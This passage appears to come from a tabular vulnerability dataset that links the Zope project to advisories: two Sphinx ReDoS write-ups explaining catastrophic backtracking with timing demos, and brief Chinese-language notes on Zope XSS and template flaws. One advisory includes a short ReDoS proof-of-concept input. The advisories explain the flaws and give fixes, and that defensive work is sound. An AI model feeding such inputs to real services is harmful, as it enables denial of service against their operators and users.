The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
zopefoundation_Zope,Sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
zopefoundation_Zope,Zope2,4.0,True,CVE-2023-42458,CWE-79 CWE-80,2023-09-21,"Zope是Zope社区的一套使用Python语言编写的、面向对象的开源Web应用服务器。
Zope存在安全漏洞，该漏洞源于SVG图像存在存储型跨站脚本漏洞（XSS）漏洞。攻击者可利用该漏洞通过上传图像，诱骗用户访问特制的链接从而执行恶意代码。受影响的产品和版本：Zope 4.8.9及之前版本，5.8.4及之前版本。",4,0
zopefoundation_Zope,Zope2,4.0,True,CVE-2021-32633,CWE-22,2021-05-21,"Zope是Zope（ZOPE）社区的一套使用Python语言编写的、面向对象的开源Web应用服务器。
Zope 在4.6之前版本和5.2版本存在安全漏洞，该漏洞允许不受信任的用户通过web添加编辑Zope页面模板的站点，从而触发该漏洞。",2,0
